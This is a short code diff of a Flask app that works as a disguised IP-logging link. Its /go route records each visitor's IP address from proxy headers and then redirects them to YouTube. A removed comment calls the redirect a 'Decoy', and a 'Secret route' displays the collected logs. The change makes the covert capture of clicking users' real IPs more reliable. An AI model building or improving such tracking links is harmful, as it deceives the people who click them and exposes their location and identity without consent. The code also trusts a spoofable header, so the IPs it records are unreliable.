@@ -16,16 +16,17 @@ def home():
 
 @app.route('/go')
 def track():
-    # Fix: Get the real user IP even if there are proxies
-    raw_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    if raw_ip and ',' in raw_ip:
-        ip = raw_ip.split(',')[0].strip()
+    # 1. Look for the standard Render/Proxy header
+    x_forwarded = request.headers.get('X-Forwarded-For')
+    
+    if x_forwarded:
+        # Grab the very first IP in the list (the actual user)
+        ip = x_forwarded.split(',')[0].strip()
     else:
-        ip = raw_ip
+        # 2. Fallback to Real-IP header (used by some providers)
+        ip = request.headers.get('X-Real-IP', request.remote_addr)
 
     log_ip(ip)
-    
-    # Decoy redirect to YouTube
     return redirect("https://www.youtube.com")
 
 # Secret route to view your logs in the browser
